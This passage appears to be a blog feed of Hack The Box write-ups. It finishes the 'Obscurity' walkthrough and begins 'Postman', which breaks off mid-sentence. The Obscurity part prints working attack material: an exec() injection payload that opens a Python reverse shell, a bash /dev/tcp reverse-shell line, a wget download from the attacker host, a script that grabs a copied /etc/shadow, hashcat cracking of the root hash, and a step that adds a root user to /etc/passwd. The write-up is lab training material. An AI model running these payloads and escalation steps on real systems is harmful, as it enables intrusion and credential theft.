            request <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>parseRequest(request)
            self<span style="color:#f92672">.</span>doc <span style="color:#f92672">=</span> request[<span style="color:#e6db74">&#34;doc&#34;</span>]

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseRequest</span>(self, request):
        req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        method,doc,vers <span style="color:#f92672">=</span> req[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">serveDoc</span>(self, path, docRoot):
    path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
    <span style="color:#66d9ef">try</span>:
        info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;output = &#39;Document: {}&#39;&#34;</span> <span style="color:#75715e"># Keep the output for later debug</span>
        <span style="color:#66d9ef">exec</span>(info<span style="color:#f92672">.</span>format(path)) <span style="color:#75715e"># This is how you do string formatting, right?</span>
</code></pre></div><p>That looks like it&rsquo;s formatting the document path, and executing it.
I can abuse this by injecting python that <code>exec()</code> will execute. This means I should be able to invoke a reverse shell if I inject it correctly.</p>
<p>How do I manipulate the path variable? Let&rsquo;s follow the logic in reverse:</p>
<hr>
<p>This is where the path variable is passed, it will be whatever is in request.doc</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">document <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>serveDoc(request<span style="color:#f92672">.</span>doc, DOC_ROOT)
</code></pre></div><hr>
<p>This is where the request data is handled. It&rsquo;s decoded from raw bytes into an ascii string.
There is an  issue though:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">req <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</code></pre></div><p>This is executed when a new request object is initialized. I need to use <code>\n</code> to get my own code to execture.
Luckily I can get around this problem because of this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">path <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(path)
</code></pre></div><p>According to the documentation here: <a href="https://docs.python.org/3/library/urllib.parse.html">https://docs.python.org/3/library/urllib.parse.html</a></p>
<p><code>Example: unquote('/El%20Ni%C3%B1o/') yields '/El Ni√±o/'.</code></p>
<p>I can use the <code>%xx</code> notation to insert <code>\n</code> that won&rsquo;t be removed by the strip function above.
The hex representation of a <code>\n</code> is <code>0A</code>, so I can inject code using <code>%0A</code> to insert a new line.</p>
<p>There&rsquo;s an easy way to run system commands using python:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;wget http://10.10.14.6:8000/socat&#34;</span>)
</code></pre></div><p>That particular command downloads socat. I sometimes use a static socat binary to get a full TTY shell. In this case it&rsquo;s a nice way to test if the command injection works too since it will notify me when there&rsquo;s a download.</p>
<p>To inject that command I have to format it correctly. It has to be on the first line of the HTTP request, in the third space.
On top of that it can&rsquo;t have a newline character, but it can have <code>%0A</code> which will later be interperted as a new line.</p>
<p>If I send the payload:
<code>a'%0Aos.system(&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&quot;)#</code></p>
<p>Python will execute it as:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Document: a&#39;</span>
os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1&#34;</span>)<span style="color:#75715e">#&#39;</span>
</code></pre></div><p>It should just allow me to navigate there, but it&rsquo;s not working. I&rsquo;m going to run a local copy of the server and debug it to see what&rsquo;s happening.</p>
<hr>
<h1 id="popping-the-reverse-shell">Popping the Reverse Shell</h1>
<p>After poking around locally I determined two things:</p>
<ol>
<li>All commands must begin with <code>'%0A</code> to start a new line.</li>
<li>The last character must be <code>%23</code>, which converts to <code>#</code> which will comment out the final single quote</li>
</ol>
<p>I couldn&rsquo;t get the normal bash reverse shell to work, but I did get a python one working.</p>
<p>Here&rsquo;s the code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;10.10.29.6&#39;</span>,<span style="color:#ae81ff">8440</span>))
os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
<span style="color:#f92672">import</span> pty
pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#39;/bin/bash&#39;</span>)
</code></pre></div><p>To inject this code it must have every new line changed into <code>%0A</code>, be prepended by a single quote followed by <code>%0A</code>, and appended with <code>%23</code>. The end result is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">test<span style="color:#e6db74">&#39;%0As=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%0As.connect((&#39;</span>10.10.14.29<span style="color:#e6db74">&#39;,8440))%0Aos.dup2(s.fileno(),0)%0Aos.dup2(s.fileno(),1)%0Aos.dup2(s.fileno(),2)%0Aimport%20pty%0Apty.spawn(&#39;</span>/bin/bash<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>%23
</code></pre></div><p>It works!</p>

    <figure class="left" >
        <img src="1576170621.png"   />

        
            <figcaption class="center" >Got a limited shell</figcaption>
        
    </figure>


<hr>
<h1 id="getting-user">Getting User</h1>
<p>Navigating to the home directory of robert shows a lot of interesting stuff:

    <figure class="left" >
        <img src="1576170738.png"   />

        
    </figure>

</p>
<p>passwordreminder.txt:
<code>¬¥√ë√à√å√â√†√ô√Å√ë√©¬Ø¬∑¬øk</code></p>
<p>check.txt
<code>Encrypting this file with your key should result in out.txt, make sure your key is correct!</code></p>
<p>out.txt
<code>¬¶√ö√à√™√ö√û√ò√õ√ù√ù¬â√ó√ê√ä√ü¬Ö√û√ä√ö√â¬í√¶√ü√ù√ã¬à√ö√õ√ö√™¬Å√ô√â√´¬è√©√ë√í√ù√ç√ê¬Ö√™√Ü√°√ô√û√£¬ñ√í√ë¬à√ê√°√ô¬¶√ï√¶√ò¬û¬è√£√ä√é√ç¬Å√ü√ö√™√Ü¬é√ù√°√§√®¬â√é√ç√ö¬å√é√´¬Å√ë√ì√§√°√õ√å√ó¬â¬Åv</code></p>
<p>If I had to guess, <code>out.txt</code> is the encrypted version of <code>check.txt</code>, using the <code>SuperSecureCrypt.py</code> script. The encryption is pretty simple:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
    keylen <span style="color:#f92672">=</span> len(key)
    keyPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    encrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> text:
        keyChr <span style="color:#f92672">=</span> key[keyPos]
        newChr <span style="color:#f92672">=</span> ord(x)
        newChr <span style="color:#f92672">=</span> chr((newChr <span style="color:#f92672">+</span> ord(keyChr)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">255</span>)
        encrypted <span style="color:#f92672">+=</span> newChr
        keyPos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        keyPos <span style="color:#f92672">=</span> keyPos <span style="color:#f92672">%</span> keylen
    <span style="color:#66d9ef">return</span> encrypted
</code></pre></div><p>It iterates through the string to be encrypted and does the following:</p>
<ol>
<li>Grabs the first character of the key, and unencrypted string.</li>
<li>Gets the ordinal value of both using (ord), and adds them together.</li>
<li>Does a modulous operation against 255, this ensure the value stays below 255.</li>
</ol>
<p>Looking at the encryption it became clear that multiple valid keys could be used due to the modulous operation performed. Through some trial and error I determined the following algorithim to derive a valid key:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">if</span> enc_ord &gt; unenc_ord
enc_ord - unenc_ord <span style="color:#f92672">=</span> key_ord

<span style="color:#66d9ef">if</span> enc_ord &gt; unenc_ord
enc_ord + <span style="color:#ae81ff">255</span> - unenc_ord <span style="color:#f92672">=</span> key_ord
</code></pre></div><p>Now it&rsquo;s time to turn concept into reality. There&rsquo;s a catch though&hellip;</p>
<p>When dealing with encryption you can end up with non-printable characters. This is why the output of out.txt looks so wonky, it&rsquo;s got some bytes in there that don&rsquo;t translate to a pretty character.</p>
<p>The solution is to ensure we are working on the bytes in python. This can easily be achieved by reading the data from the files themselves rather than copy and pasting values, which could screw up some of the special characters.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;passwordreminder.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> e_in:
    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;out.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> u_in:
        enc <span style="color:#f92672">=</span> e_in<span style="color:#f92672">.</span>read()
        unenc <span style="color:#f92672">=</span> u_in<span style="color:#f92672">.</span>read()
        key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(len(unenc)):
            e <span style="color:#f92672">=</span> ord(enc[x])
            u <span style="color:#f92672">=</span> ord(unenc[x])
            <span style="color:#66d9ef">if</span> e <span style="color:#f92672">&gt;</span> u:
                key <span style="color:#f92672">+=</span> chr(e <span style="color:#f92672">-</span> u)
            <span style="color:#66d9ef">else</span>:
                key <span style="color:#f92672">+=</span> chr(<span style="color:#ae81ff">255</span> <span style="color:#f92672">+</span> e <span style="color:#f92672">-</span> u)

        <span style="color:#66d9ef">print</span>(key)
</code></pre></div>
    <figure class="left" >
        <img src="1579899711610.png"   />

        
            <figcaption class="center" >Success!</figcaption>
        
    </figure>


<p><code>alexandrovichalexandrovich...</code>
That&rsquo;s repeating, so the key is: <code>alexandrovich</code></p>
<blockquote>
<p>Editor&rsquo;s Note:</p>
<p>You might notice I ran this from the <code>robert</code> user account. I actually came back to this box later to update the script. My first iteration simply had the special characters pasted from <code>cat</code> output, and somehow through the magic of VS Code, and Windows Terminal, it kept all the underlying byte values and just worked.</p>
<p>I discovered this isn&rsquo;t the case for every environment and decided to improve my script so it would always work no matter what the environement was.</p>
</blockquote>
<p>Now I should be able to use the script on the box itself since I have execute permissions to find out that reminder.</p>
<p><code>python3 ./SuperSecureCrypt.py -d -i passwordreminder.txt -o /tmp/a.txt -k alexandrovich</code></p>
<p>Doing so got me this:
<code>SecThruObsFTW</code></p>

    <figure class="left" >
        <img src="1577058738.png"   />

        
    </figure>


<p>I was then able to su in and get user flag:

    <figure class="left" >
        <img src="1577058791.png"   />

        
    </figure>

</p>
<p>On top of that I was able to SSH in using the same password.</p>
<hr>
<h1 id="getting-root">Getting Root</h1>
<p>Running <code>sudo -l</code> returns that I can use the better ssh program as root:</p>

    <figure class="left" >
        <img src="1577062677.png"   />

        
    </figure>


<p>Here&rsquo;s the code for it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> crypt
<span style="color:#f92672">import</span> traceback
<span style="color:#f92672">import</span> subprocess

path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;user&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;authenticated&#34;</span>: <span style="color:#ae81ff">0</span>}
<span style="color:#66d9ef">try</span>:
    session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter username: &#34;</span>)
    passW <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter password: &#34;</span>)

    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/etc/shadow&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
    data <span style="color:#f92672">=</span> [(p<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;$&#34;</span> <span style="color:#f92672">in</span> p <span style="color:#66d9ef">else</span> None) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> data]
    passwords <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> data:
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x <span style="color:#f92672">==</span> None:
            passwords<span style="color:#f92672">.</span>append(x)

    passwordFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(p) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords])
    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
        f<span style="color:#f92672">.</span>write(passwordFile)
    time<span style="color:#f92672">.</span>sleep(<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>)
    salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    realPass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords:
        <span style="color:#66d9ef">if</span> p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> session[<span style="color:#e6db74">&#39;user&#39;</span>]:
            salt, realPass <span style="color:#f92672">=</span> p[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;$&#39;</span>)[<span style="color:#ae81ff">2</span>:]
            <span style="color:#66d9ef">break</span>

    <span style="color:#66d9ef">if</span> salt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid user&#34;</span>)
        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
    salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$6$&#39;</span><span style="color:#f92672">+</span>salt<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;$&#39;</span>
    realPass <span style="color:#f92672">=</span> salt <span style="color:#f92672">+</span> realPass

    hash <span style="color:#f92672">=</span> crypt<span style="color:#f92672">.</span>crypt(passW, salt)

    <span style="color:#66d9ef">if</span> hash <span style="color:#f92672">==</span> realPass:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Authed!&#34;</span>)
        session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Incorrect pass&#34;</span>)
        os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
    os<span style="color:#f92672">.</span>remove(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>,path))
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
    traceback<span style="color:#f92672">.</span>print_exc()
    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)

<span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
    <span style="color:#66d9ef">while</span> True:
        command <span style="color:#f92672">=</span> input(session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@Obscure$ &#34;</span>)
        cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;sudo&#39;</span>, <span style="color:#e6db74">&#39;-u&#39;</span>,  session[<span style="color:#e6db74">&#39;user&#39;</span>]]
        cmd<span style="color:#f92672">.</span>extend(command<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>))
        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)

        o,e <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>communicate()
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
</code></pre></div><p>Following the source code I can see it copies the data from /etc/shadow to /tmp/RANDOM.
It deletes it pretty quickly, but I can create a python script to monitor the file system and copy it.
I have <code>.1</code> seconds of sleep after the file is created to grab it.</p>
<p>First I had to create the directory <code>/tmp/SSH</code> with <code>mkdir /tmp/SSH</code>. Then I had to invoke the script using with <code>sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>. Finally, I had to enter a valid username, but any password would do. This would cause the script to copy the shadow file to /tmp, so that my script will catch it and copy it.</p>
<p>The following script did the trick:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> shutil
<span style="color:#66d9ef">while</span> True:
    files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>)
    <span style="color:#66d9ef">if</span> len(files) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Found!&#34;</span>)
        shutil<span style="color:#f92672">.</span>copyfile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>, files[<span style="color:#ae81ff">0</span>]), <span style="color:#e6db74">&#39;/tmp/pass&#39;</span>)
        <span style="color:#66d9ef">break</span>
</code></pre></div>
    <figure class="left" >
        <img src="1577086410.png"   />

        
    </figure>


<p>Now I have the root hash value + salt, I should be able to crack it.</p>
<pre><code>$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
</code></pre><p>I stuck that hash into a file on my main rig, and ran the hashcat command:
<code>.\hashcat64.exe -m 1800 -a 0 ..\obscur.hash ..\rockyou.txt</code></p>
<p>
    <figure class="left" >
        <img src="1577087612.png"   />

        
    </figure>



    <figure class="left" >
        <img src="1577087971.png"   />

        
    </figure>

</p>
<p>Paydirt, it should be <code>mercedes</code>. Got it quick too, doing 33,718 hashes a second.
Logging in via su worked!</p>

    <figure class="left" >
        <img src="1577088036.png"   />

        
    </figure>


<hr>
<h1 id="getting-root-another-way">Getting Root Another Way</h1>
<p>There&rsquo;s another way to root this machine that I learned about. If you supply <code>sudo</code> with a second <code>-u</code> argument it will ignore the first, therefore if we send <code>-u root &lt;command&gt;</code> to the python shell script it should run as root.</p>
<p>I can&rsquo;t pop <code>/bin/bash</code> over the weird python command prompt, but I can append a root user to the <code>/etc/passwd</code> file and use that to login. I found an example here: <a href="https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file">https://security.stackexchange.com/questions/151700/privilege-escalation-using-passwd-file</a></p>
<p><code>-u root echo &quot;root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</code></p>
<p>This didn&rsquo;t work however, there was an issue using the append operator. I suspect python&rsquo;s <code>subprocess.popen()</code> doesn&rsquo;t allow them.
No matter, I can simply change the access to /etc/passwd so robert can modify it.</p>
<p><code>-u root chmod 777 /etc/passwd</code>
<code>nano /etc/passwd</code></p>
<p>I added <code>root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash</code> to the end of the file, and then used <code>su</code> to login as <code>root2</code> with the password <code>mrcake</code>.</p>
<p>Success! It would have been easier to just read the flag, I always like to pop a shell however.

    <figure class="left" >
        <img src="1577098097.png"   />

        
    </figure>

</p>
<p>Until next time, this is jivex5k signing off!</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Postman</title>
            <link>https://foresthex.com/posts/hack-the-box-postman/</link>
            <pubDate>Fri, 20 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/hack-the-box-postman/</guid>
            <description>Welcome to another Forest Hex hacking adventure! üå≤üèπ Today I will be hacking a box named Postman.
Postman HTB Card  Feel free to jump around as always:
 Port Scan Investigating Open Ports Finding a Foothold Escalating to a user shell Getting Root   Port Scan Let&amp;rsquo;s dive right in with a port scan: nmap -p- -sC -sV --min-rate=1000 -T4 10.10.10.160
 Looks like I have a few avenues of attack here.</description>
            <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! üå≤üèπ</h3>
<p><em>Today I will be hacking a box named Postman.</em></p>

    <figure class="left" >
        <img src="1575350169.png"   />

        
            <figcaption class="center" >Postman HTB Card</figcaption>
        
    </figure>


<p>Feel free to jump around as always:</p>
<ul>
<li><a href="#port-scan">Port Scan</a></li>
<li><a href="#investigating-open-ports">Investigating Open Ports</a></li>
<li><a href="#finding-a-foothold">Finding a Foothold</a></li>
<li><a href="#escalating-to-a-user-shell">Escalating to a user shell</a></li>
<li><a href="#getting-root">Getting Root</a></li>
</ul>
<hr>
<h1 id="port-scan">Port Scan</h1>
<p>Let&rsquo;s dive right in with a port scan: <code>nmap -p- -sC -sV --min-rate=1000 -T4 10.10.10.160</code></p>

    <figure class="left" >
        <img src="1575350463.png"   />

        
    </figure>


<p>Looks like I have a few avenues of attack here. Webmin on port 10000 interests me greatly, I remember a lot of webmin exploits existing the last time I searched for them. My gut is to always check port 80 first though:</p>
<hr>
<h1 id="investigating-open-ports">Investigating Open Ports</h1>
<h4 id="port-80">Port 80:</h4>
<p>
    <figure class="left" >
        <img src="1575350617.png"   />

        
            <figcaption class="center" >Cyber Geek&#39;s Pesonal Web Site</figcaption>
        
    </figure>


Hmmm, the Cyber Geek eh? Well there&rsquo;s not much to the site here, there&rsquo;s no place for input and the source doesn&rsquo;t seem to be hiding anything. Ah well, time to move along.</p>
<h4 id="port-1000">Port 1000:</h4>

    <figure class="left" >
        <img src="1575350786.png"   />

        
            <figcaption class="center" >Hint to use HTTPS</figcaption>
        
    </figure>


<p>A suggestion to try SSL protocol, alright then&hellip;

    <figure class="left" >
        <img src="1575350837.png"   />

        
            <figcaption class="center" >Webmin Login</figcaption>
        
    </figure>

</p>
<p>A Webmin login page, cool. I messed around a bit here with some SQL injection and default password combos but got nowhere, I wasn&rsquo;t expecting it to but you never know.</p>
<h4 id="port-6379">Port 6379</h4>

    <figure class="left" >
        <img src="1575351187.png"   />

        
    </figure>


<p>Interesting&hellip; I worked with Redis a while back, it&rsquo;s a way to store key value pairs on a server that you can interface with over HTTP requests. I looked up how to list all key value pairs: <a href="https://chartio.com/resources/tutorials/how-to-get-all-keys-in-redis/">https://chartio.com/resources/tutorials/how-to-get-all-keys-in-redis/</a></p>

    <figure class="left" >
        <img src="1575351346.png"   />

        
    </figure>


<p>So I need to figure out how to send this command, maybe I can just use netcat.

    <figure class="left" >
        <img src="1575351407.png"   />

        
    </figure>

</p>
<p>Paydirt, though I&rsquo;m not sure what it&rsquo;s for yet. Cracklist sounds interesting&hellip;

    <figure class="left" >
        <img src="1575351538.png"   />

        
    </figure>

</p>
<p>Hm, a public ssh key, interesting. I&rsquo;ll save it in CherryTree for now.</p>
<p>Well the initial enumeration is done, time to search for some exploits.</p>
<blockquote>
<p>It turns out that this SSH key was from another hacking attempt, I just did not realize it at the time.</p>
</blockquote>
<hr>
<h1 id="finding-a-foothold">Finding a Foothold</h1>
<p>First I decided to use searchsploit for a Webmin exploit:</p>

    <figure class="left" >
        <img src="1575351841.png"   />

        
    </figure>


<p>The highlighted one seems perfect, according to NMap the versions is 1.910. It&rsquo;s a metasploit module which means it could be easy to use, but you never know. I read the details on this exploit, it&rsquo;s clear we need credentials first:
<code>Any user authorized to the &quot;Package Updates&quot; module can execute arbitrary commands with root privileges.</code></p>
<p>That could be something we use later, but for now it&rsquo;s time to move somewhere else. The other exploits for versions above 1.910 are worth investigating.</p>
<p>This one sounds promising: <a href="https://www.exploit-db.com/exploits/47230">https://www.exploit-db.com/exploits/47230</a></p>
<p><code>This module exploits a backdoor in Webmin versions 1.890 through 1.920. Only the SourceForge downloads were backdoored, but they are listed as official downloads on the project's site</code></p>
<p>It could work, the chances are lower for our version however according to the details. Well, we can check it pretty quickly with metasploit so let&rsquo;s do that.</p>

    <figure class="left" >
        <img src="1575352689.png"   />

        
    </figure>


<p>Bummer. The other one listed was the same exploit, just a different version so that won&rsquo;t work either. That leaves me with Apache exploits, which are usually a dead end in my experience.</p>
<h2 id="the-redis-modules-rce-exploit">The Redis Modules RCE Exploit</h2>
<hr>
<p>After checking out searchsploit I confirmed there are no suitable apache exploits here. My gut points me back at the redis server, I&rsquo;m going to install redis-cli to see what I can find.</p>
<p>Running the <code>INFO</code> command in netcat got me the version number:
<code>redis_version:4.0.9</code></p>
<p>Poking around in the actual client led me to believe the cracklist variable was a fluke. There&rsquo;s also an exploit I found for redis 4/5 that has RCE, I&rsquo;m going to try it out.</p>

    <figure class="left" >
        <img src="1575354776.png"   />

        
    </figure>


<p>Oh yeah, that&rsquo;s what I like to see. Time to cross my fingers and run <code>exploit</code>.</p>

    <figure class="left" >
        <img src="1575354982.png"   />

        
    </figure>


<p>Close but no cigar&hellip; I played around a bit and decided to manually listen on netcat but that didn&rsquo;t work either. I did some more research and decided to update metasploit, if this fails I&rsquo;ll try to understand the exploit manually and see if there&rsquo;s a non-metasploit version.</p>
<p>After a bit of searching I found a python version:
